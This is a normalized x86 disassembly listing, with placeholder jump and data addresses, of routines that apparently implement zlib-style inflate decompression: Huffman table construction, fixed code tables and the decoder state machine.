mov eax [ ecx + 0x1c ]
mov [ eax ] 0xd
mov edx [ esp ]
mov [ edx + 0x18 ] rw-data
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
mov [ eax + 0x4 ] 0x5
jmp r-xdata
test [ esp + 0xc ] 0x20
jne r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov [ edx ] 0xd
mov ecx [ esp ]
mov [ ecx + 0x18 ] rw-data
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov [ edx + 0x4 ] 0x5
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x1c ]
mov ecx [ ecx + 0x1c ]
add ecx 0x4
mov eax [ edx + 0x14 ]
mov edx [ esp ]
call sub_468778
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov eax [ ecx ]
cmp eax 0xd
ja r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
mov [ eax ] 0xc
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov [ edx ] 0xd
mov ecx [ esp ]
mov [ ecx + 0x18 ] rw-data
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov [ edx + 0x4 ] 0x5
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
mov [ eax ] 0x1
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov [ edx ] 0xd
mov ecx [ esp ]
mov [ ecx + 0x18 ] rw-data
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov [ edx + 0x4 ] 0x5
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ ecx ] 0x2
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
mov [ eax ] 0x7
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov [ edx ] 0x8
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ ecx ] 0xc
jmp r-xdata
sub_4649d0
add esp 0xfffffff0
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ esp ]
cmp [ edx + 0x1c ] 0x0
je r-xdata
add esp 0x10
retn
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
cmp [ eax ] 0x6
je r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax 0x1
call sub_468540
mov edx [ esp ]
cmp eax [ edx + 0x30 ]
je r-xdata
mov edx [ esp ]
mov [ edx + 0x30 ] 0x1
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
mov ecx [ eax + 0x10 ]
mov edx 0x1
shl edx cl
cmp edx [ esp + 0xc ]
ja r-xdata
mov eax 0xfffffffd
jmp r-xdata
mov ecx [ esp ]
mov edx [ esp + 0x4 ]
mov eax [ ecx + 0x1c ]
mov ecx [ esp + 0xc ]
mov eax [ eax + 0x14 ]
call sub_469bf4
mov eax [ esp ]
mov edx [ eax + 0x1c ]
xor eax eax
mov [ edx ] 0x7
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov ecx [ edx + 0x10 ]
mov eax 0x1
shl eax cl
dec eax
mov [ esp + 0xc ] eax
mov edx [ esp + 0x8 ]
sub edx [ esp + 0xc ]
add [ esp + 0x4 ] edx
sub_464a94
add esp 0xffffffe8
mov [ esp ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ esp ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
add esp 0x18
retn
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
cmp [ ecx ] 0xd
je r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x4 ]
mov [ esp + 0x4 ] eax
test eax eax
jne r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov [ edx ] 0xd
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ esp ]
mov ecx [ edx ]
mov [ esp + 0x8 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov ecx [ edx + 0x4 ]
mov [ esp + 0xc ] ecx
jmp r-xdata
mov eax 0xfffffffb
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ esp ]
sub ecx [ eax ]
mov edx [ esp ]
add [ edx + 0x8 ] ecx
mov ecx [ esp + 0x8 ]
mov eax [ esp ]
mov [ eax ] ecx
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
mov [ ecx + 0x4 ] edx
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov ecx [ esp + 0xc ]
mov [ edx + 0x4 ] ecx
cmp [ esp + 0xc ] 0x4
je r-xdata
cmp [ esp + 0xc ] 0x4
jb r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x8 ]
mov [ esp + 0x10 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov [ esp + 0x14 ] edx
mov eax [ esp ]
call sub_464268
mov edx [ esp + 0x10 ]
mov ecx [ esp ]
mov [ ecx + 0x8 ] edx
mov eax [ esp + 0x14 ]
mov edx [ esp ]
mov [ edx + 0x14 ] eax
mov ecx [ esp ]
mov eax [ ecx + 0x1c ]
mov [ eax ] 0x7
xor eax eax
mov eax 0xfffffffd
jmp r-xdata
xor eax eax
cmp [ esp + 0xc ] 0x2
jb r-xdata
mov edx [ esp + 0x8 ]
cmp al [ edx ]
jne r-xdata
add eax 0xff
mov ecx [ esp + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
inc [ esp + 0xc ]
jmp r-xdata
mov edx 0x4
sub edx [ esp + 0xc ]
mov [ esp + 0xc ] edx
xor eax eax
mov [ esp + 0xc ] eax
jmp r-xdata
inc [ esp + 0x8 ]
dec [ esp + 0x4 ]
sub_464bd4
push ebp
mov ebp esp
add esp 0xfffffa64
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xa0 ]
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x30 ]
xor ecx ecx
mov [ edx ] ecx
add [ ebp - 0x30 ] 0x4
mov eax [ ebp - 0x30 ]
xor edx edx
mov [ eax ] edx
add [ ebp - 0x30 ] 0x4
mov ecx [ ebp - 0x30 ]
xor eax eax
mov [ ecx ] eax
add [ ebp - 0x30 ] 0x4
mov edx [ ebp - 0x30 ]
xor ecx ecx
mov [ edx ] ecx
add [ ebp - 0x30 ] 0x4
mov eax [ ebp - 0x30 ]
xor edx edx
mov [ eax ] edx
add [ ebp - 0x30 ] 0x4
mov ecx [ ebp - 0x30 ]
xor eax eax
mov [ ecx ] eax
add [ ebp - 0x30 ] 0x4
mov edx [ ebp - 0x30 ]
xor ecx ecx
mov [ edx ] ecx
add [ ebp - 0x30 ] 0x4
mov eax [ ebp - 0x30 ]
xor edx edx
mov [ eax ] edx
add [ ebp - 0x30 ] 0x4
mov ecx [ ebp - 0x30 ]
xor eax eax
mov [ ecx ] eax
add [ ebp - 0x30 ] 0x4
mov edx [ ebp - 0x30 ]
xor ecx ecx
mov [ edx ] ecx
add [ ebp - 0x30 ] 0x4
mov eax [ ebp - 0x30 ]
xor edx edx
mov [ eax ] edx
add [ ebp - 0x30 ] 0x4
mov ecx [ ebp - 0x30 ]
xor eax eax
mov [ ecx ] eax
add [ ebp - 0x30 ] 0x4
mov edx [ ebp - 0x30 ]
xor ecx ecx
mov [ edx ] ecx
add [ ebp - 0x30 ] 0x4
mov eax [ ebp - 0x30 ]
xor edx edx
mov [ eax ] edx
add [ ebp - 0x30 ] 0x4
mov ecx [ ebp - 0x30 ]
xor eax eax
mov [ ecx ] eax
add [ ebp - 0x30 ] 0x4
mov edx [ ebp - 0x30 ]
xor ecx ecx
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x30 ]
mov eax [ ecx ]
inc [ ebp + eax * 4 - 0xa0 ]
add [ ebp - 0x30 ] 0x4
dec [ ebp - 0x20 ]
jne r-xdata
mov edx [ ebp - 0xa0 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp + 0xc ]
lea eax [ ebp - 0x9c ]
mov ecx [ edx ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x24 ] 0x1
mov [ ebp - 0x50 ] eax
mov ecx [ ebp + 0x10 ]
xor eax eax
mov [ ecx ] eax
xor ecx ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov [ edx ] ecx
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x24 ]
jae r-xdata
inc [ ebp - 0x24 ]
add [ ebp - 0x50 ] 0x4
cmp [ ebp - 0x24 ] 0xf
jbe r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov [ ebp - 0x20 ] 0xf
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x54 ] ecx
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x2c ] edx
mov edx [ ebp - 0x50 ]
cmp [ edx ] 0x0
jne r-xdata
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x20 ]
jbe r-xdata
dec [ ebp - 0x20 ]
add [ ebp - 0x54 ] 0xfffffffc
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x2c ]
mov [ edx ] ecx
mov ecx [ ebp - 0x24 ]
mov eax 0x1
shl eax cl
mov [ ebp - 0x48 ] eax
mov edx [ ebp - 0x24 ]
lea eax [ ebp + edx * 4 - 0xa0 ]
mov [ ebp - 0x58 ] eax
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x54 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x48 ]
sub eax [ ebp + ecx * 4 - 0xa0 ]
mov [ ebp - 0x48 ] eax
test eax eax
jge r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ ebp - 0x48 ]
sub eax [ ecx ]
mov [ ebp - 0x48 ] eax
test eax eax
jge r-xdata
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x48 ]
add [ ebp + edx * 4 - 0xa0 ] ecx
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x598 ] eax
lea edx [ ebp - 0x9c ]
mov [ ebp - 0x30 ] edx
lea ecx [ ebp - 0x594 ]
mov [ ebp - 0x44 ] ecx
jmp r-xdata
mov eax 0xfffffffd
jmp r-xdata
add [ ebp - 0x58 ] 0x4
inc [ ebp - 0x24 ]
shl [ ebp - 0x48 ] 0x1
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x20 ]
jb r-xdata
mov eax 0xfffffffd
jmp r-xdata
dec [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0x30 ]
add [ ebp - 0x30 ] 0x4
mov edx [ eax ]
add [ ebp - 0x24 ] edx
mov ecx [ ebp - 0x44 ]
mov eax [ ebp - 0x24 ]
mov [ ecx ] eax
add [ ebp - 0x44 ] 0x4
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x20 ] ecx
inc [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0x8 ]
jb r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ ebp + eax * 4 - 0x59c ]
inc [ ebp + eax * 4 - 0x59c ]
mov eax [ ebp - 0x20 ]
mov [ ebp + ecx * 4 - 0x55c ] eax
mov eax [ ebp - 0x30 ]
add [ ebp - 0x30 ] 0x4
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
test edx edx
je r-xdata
xor ecx ecx
lea eax [ ebp - 0x55c ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x59c ] ecx
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x1c ] 0xffffffff
mov edx [ ebp - 0x2c ]
xor ecx ecx
neg edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0xdc ] eax
xor edx edx
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x4c ] ecx
mov eax [ ebp - 0x28 ]
lea edx [ ebp + eax * 4 - 0xa0 ]
mov [ ebp - 0x58 ] edx
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x18 ]
jg r-xdata
cmp [ ebp - 0x48 ] 0x0
mov eax 0xfffffffb
je r-xdata
mov eax [ ebp - 0x58 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
add eax 0x5
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
mov edx [ ebp - 0x10 ]
add [ ebp - 0x10 ] 0xffffffff
test edx edx
jne r-xdata
mov ecx [ ebp - 0x1c ]
lea eax [ ebp + ecx * 4 - 0x59c ]
mov [ ebp - 0x60 ] eax
mov edx [ ebp - 0x1c ]
lea ecx [ ebp + edx * 4 - 0xdc ]
mov [ ebp - 0x5c ] ecx
jmp r-xdata
inc [ ebp - 0x28 ]
add [ ebp - 0x58 ] 0x4
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x18 ]
jle r-xdata
mov eax [ ebp - 0x40 ]
add eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x28 ]
jl r-xdata
inc [ ebp - 0x1c ]
add [ ebp - 0x60 ] 0x4
add [ ebp - 0x5c ] 0x4
mov eax [ ebp - 0x2c ]
add [ ebp - 0x40 ] eax
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x40 ]
mov [ ebp - 0x4c ] edx
mov ecx [ ebp - 0x4c ]
cmp ecx [ ebp - 0x2c ]
jbe r-xdata
mov dl [ ebp - 0x28 ]
sub dl [ ebp - 0x40 ]
mov [ ebp - 0x3b ] dl
mov ecx [ ebp - 0x8 ]
shl ecx 0x2
lea eax [ ebp - 0x55c ]
add ecx eax
cmp ecx [ ebp - 0x30 ]
ja r-xdata
mov eax [ ebp - 0x4c ]
mov eax [ ebp - 0x2c ]
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov ecx [ edx ]
cmp ecx [ ebp - 0xc ]
jae r-xdata
mov [ ebp - 0x3c ] 0xc0
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov eax 0x1
shl eax cl
mov [ ebp - 0x4c ] eax
mov ecx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
inc edx
mov eax [ ecx + 0x28 ]
mov ecx 0x8
call [ ebx + 0x20 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
inc ecx
sub [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x28 ]
shl eax 0x2
lea edx [ ebp - 0xa0 ]
add eax edx
mov [ ebp - 0x44 ] eax
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0x4c ]
jae r-xdata
mov [ ebp - 0x4c ] eax
mov eax 0x1
mov edx [ ebp - 0x28 ]
sub edx [ ebp - 0x40 ]
mov ecx edx
mov [ ebp - 0x24 ] edx
shl eax cl
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x10 ]
inc edx
cmp eax edx
jbe r-xdata
mov edx [ ebp - 0x30 ]
mov ecx [ edx ]
sub ecx [ ebp - 0xc ]
mov eax [ ebp + 0x14 ]
mov dl [ eax + ecx * 4 ]
add dl 0x50
mov [ ebp - 0x3c ] dl
mov ecx [ ebp - 0x30 ]
mov eax [ ecx ]
sub eax [ ebp - 0xc ]
mov edx [ ebp + 0x18 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x38 ] ecx
add [ ebp - 0x30 ] 0x4
xor eax eax
mov edx [ ebp - 0x30 ]
cmp [ edx ] 0x100
jb r-xdata
mov ecx [ ebp - 0x28 ]
sub ecx [ ebp - 0x40 ]
mov eax 0x1
shl eax cl
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x40 ]
mov eax [ ebp - 0x20 ]
shr eax cl
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x4c ]
jae r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x34 ]
add edx 0x8
mov [ ecx ] edx
xor edx edx
mov eax [ ebp - 0x34 ]
add eax 0x4
mov [ ebp + 0x10 ] eax
mov [ eax ] edx
add [ ebp - 0x34 ] 0x8
mov ecx [ ebp - 0x5c ]
mov eax [ ebp - 0x34 ]
mov [ ecx ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x28 ]
dec ecx
mov eax 0x1
shl eax cl
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x3c ]
mov [ eax + edx * 8 ] ecx
mov ecx [ ebp - 0x38 ]
mov [ eax + edx * 8 + 0x4 ] ecx
mov eax [ ebp - 0x14 ]
add [ ebp - 0x24 ] eax
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x4c ]
jb r-xdata
mov [ ebp - 0x3c ] al
mov ecx [ ebp - 0x30 ]
mov eax [ ecx ]
mov [ ebp - 0x38 ] eax
add [ ebp - 0x30 ] 0x4
jmp r-xdata
add eax 0x60
mov edx [ ebp - 0x60 ]
mov ecx [ ebp - 0x20 ]
mov [ edx ] ecx
mov al [ ebp - 0x2c ]
mov [ ebp - 0x3b ] al
mov dl [ ebp - 0x24 ]
mov [ ebp - 0x3c ] dl
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] ecx
mov ecx [ ebp - 0x40 ]
sub ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x20 ]
shr eax cl
mov [ ebp - 0x24 ] eax
mov edx [ ebp - 0x5c ]
mov eax [ edx - 0x4 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x3c ]
mov [ eax + edx * 8 ] ecx
mov ecx [ ebp - 0x38 ]
mov [ eax + edx * 8 + 0x4 ] ecx
mov eax 0xfffffffc
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xdc ]
call sub_4654d4
inc [ ebp - 0x24 ]
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0x4c ]
jb r-xdata
mov ecx [ ebp - 0x20 ]
and ecx [ ebp - 0x24 ]
jne r-xdata
shl [ ebp - 0x14 ] 0x1
mov eax [ ebp - 0x14 ]
add [ ebp - 0x44 ] 0x4
mov edx [ ebp - 0x44 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ ebp - 0x24 ]
xor [ ebp - 0x20 ] edx
shr [ ebp - 0x24 ] 0x1
mov eax [ ebp - 0x24 ]
xor [ ebp - 0x20 ] eax
mov edx [ ebp - 0x1c ]
lea ecx [ ebp + edx * 4 - 0x59c ]
mov [ ebp - 0x60 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x44 ]
mov eax [ ecx ]
sub [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x40 ]
mov edx 0x1
shl edx cl
dec edx
mov eax [ ebp - 0x60 ]
and edx [ ebp - 0x20 ]
cmp edx [ eax ]
jne r-xdata
dec [ ebp - 0x1c ]
add [ ebp - 0x60 ] 0xfffffffc
mov eax [ ebp - 0x2c ]
sub [ ebp - 0x40 ] eax
sub_465168
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
push edx
mov edx 0x13
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx 0x13
mov eax [ ebp - 0x4 ]
call sub_464bd4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xfffffffd
jne r-xdata
cmp [ ebp - 0x10 ] 0xfffffffb
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] rw-data
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov edx [ ebp + 0x8 ]
call sub_4654d4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] rw-data
mov [ ebp - 0x10 ] 0xfffffffd
sub_4651dc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push rw-data
push rw-data
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx 0x101
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_464bd4
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push rw-data
push rw-data
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x14 ]
push ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
shl eax 0x2
add eax [ ebp - 0xc ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
call sub_464bd4
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0xfffffffd
jne r-xdata
xor eax eax
cmp [ ebp - 0x10 ] 0xfffffffd
jne r-xdata
cmp [ ebp - 0x10 ] 0xfffffffb
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] rw-data
jmp r-xdata
cmp [ ebp - 0x10 ] 0xfffffffb
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] rw-data
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
call sub_4654d4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] rw-data
mov [ ebp - 0x10 ] 0xfffffffd
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ eax ]
call sub_4654d4
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
call sub_4654d4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] rw-data
mov [ ebp - 0x10 ] 0xfffffffd
mov esp ebp
pop ebp
retn 0x14
sub_4652d4
add esp 0xfffffff4
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp + 0x4 ]
mov edx [ esp ]
add eax [ esp + 0x8 ]
sub eax [ esp + 0x8 ]
mov ecx [ edx ]
sub ecx eax
mov eax [ esp ]
mov [ eax ] ecx
mov edx [ esp ]
mov eax [ edx ]
shl eax 0x3
add eax rw-data
add esp 0xc
retn
sub_46530c
push ebp
mov ebp esp
add esp 0xfffffb20
cmp [ rw-data ] 0x0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
mov [ eax ] edx
mov ecx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov [ ecx ] eax
mov edx [ ebp - 0xc ]
mov ecx [ rw-data ]
mov [ edx ] ecx
mov eax [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ eax ] edx
xor eax eax
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x14 ] 0x212
mov [ ebp - 0x4c0 ] sub_4652d4
xor eax eax
lea edx [ ebp - 0x14 ]
mov [ ebp - 0x4bc ] eax
mov [ ebp - 0x4b8 ] edx
xor ecx ecx
lea eax [ ebp - 0x4a8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x18 ]
mov [ edx ] 0x8
inc [ ebp - 0x10 ]
add [ ebp - 0x18 ] 0x4
cmp [ ebp - 0x10 ] 0x90
jl r-xdata
mov ecx [ ebp - 0x10 ]
lea eax [ ebp + ecx * 4 - 0x4a8 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x10 ] 0x100
jge r-xdata
mov ecx [ ebp - 0x10 ]
lea eax [ ebp + ecx * 4 - 0x4a8 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x10 ] 0x118
jge r-xdata
mov edx [ ebp - 0x1c ]
mov [ edx ] 0x9
inc [ ebp - 0x10 ]
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x10 ] 0x100
jl r-xdata
mov ecx [ ebp - 0x10 ]
lea eax [ ebp + ecx * 4 - 0x4a8 ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x10 ] 0x120
jge r-xdata
mov edx [ ebp - 0x20 ]
mov [ edx ] 0x7
inc [ ebp - 0x10 ]
add [ ebp - 0x20 ] 0x4
cmp [ ebp - 0x10 ] 0x118
jl r-xdata
mov [ rw-data ] 0x7
push rw-data
push rw-data
push rw-data
push rw-data
lea ecx [ ebp - 0x4e0 ]
push ecx
lea eax [ ebp - 0x4a8 ]
mov ecx 0x101
mov edx 0x120
call sub_464bd4
xor eax eax
lea edx [ ebp - 0x4a8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x28 ] edx
mov edx [ ebp - 0x24 ]
mov [ edx ] 0x8
inc [ ebp - 0x10 ]
add [ ebp - 0x24 ] 0x4
cmp [ ebp - 0x10 ] 0x120
jl r-xdata
mov ecx [ ebp - 0x28 ]
mov [ ecx ] 0x5
inc [ ebp - 0x10 ]
add [ ebp - 0x28 ] 0x4
cmp [ ebp - 0x10 ] 0x1e
jl r-xdata
mov [ rw-data ] 0x5
push rw-data
push rw-data
push rw-data
push rw-data
lea eax [ ebp - 0x4e0 ]
push eax
lea eax [ ebp - 0x4a8 ]
xor ecx ecx
mov edx 0x1e
call sub_464bd4
mov [ rw-data ] 0x1
sub_4654d4
add esp 0xffffffec
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov [ esp + 0xc ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ ecx - 0x4 ]
mov [ esp + 0x10 ] eax
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
mov [ ecx - 0x4 ] edx
mov eax [ esp + 0xc ]
mov [ esp + 0x8 ] eax
mov edx [ esp + 0x10 ]
mov [ esp + 0xc ] edx
cmp [ esp + 0xc ] 0x0
jne r-xdata
xor eax eax
add esp 0x14
retn
sub [ esp + 0x8 ] 0x8
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
mov eax [ edx + 0x28 ]
mov edx [ esp + 0x8 ]
call [ ecx + 0x24 ]
mov eax [ esp + 0xc ]
mov [ esp + 0x8 ] eax
cmp [ esp + 0x8 ] 0x0
jne r-xdata
sub_465560
add esp 0xffffff88
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0x78
retn
xor eax eax
xor edx edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
mov [ esp + 0x20 ] rw-data
mov [ esp + 0x14 ] rw-data
mov ecx [ esp + 0x18 ]
mov ecx [ ecx ]
mov eax 0x1
shl eax cl
cmp eax [ esp ]
jg r-xdata
mov al [ esp + 0xc ]
mov edx [ esp + 0x1c ]
mov [ edx ] al
inc [ esp + 0x8 ]
inc [ esp + 0x1c ]
inc [ esp ]
inc [ esp + 0xc ]
add [ esp + 0x20 ] 0x4
add [ esp + 0x14 ] 0x4
cmp [ esp + 0xc ] 0x1c
jl r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
xor edx edx
mov [ esp ] edx
mov ecx [ esp + 0x8 ]
lea eax [ ecx + rw-data ]
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x20 ]
mov ecx edx
mov [ esp + 0x18 ] ecx
jmp r-xdata
mov dl [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov [ eax + rw-data ] dl
xor edx edx
mov [ esp + 0x10 ] edx
xor ecx ecx
mov [ esp + 0xc ] ecx
mov [ esp + 0x30 ] rw-data
mov [ esp + 0x24 ] rw-data
mov eax [ esp + 0x28 ]
mov ecx [ eax ]
mov edx 0x1
shl edx cl
cmp edx [ esp ]
jg r-xdata
mov dl [ esp + 0xc ]
mov ecx [ esp + 0x2c ]
mov [ ecx ] dl
inc [ esp + 0x10 ]
inc [ esp + 0x2c ]
inc [ esp ]
inc [ esp + 0xc ]
add [ esp + 0x30 ] 0x4
add [ esp + 0x24 ] 0x4
cmp [ esp + 0xc ] 0x10
jl r-xdata
mov eax [ esp + 0x24 ]
mov edx [ esp + 0x10 ]
mov [ eax ] edx
xor ecx ecx
mov [ esp ] ecx
mov eax [ esp + 0x10 ]
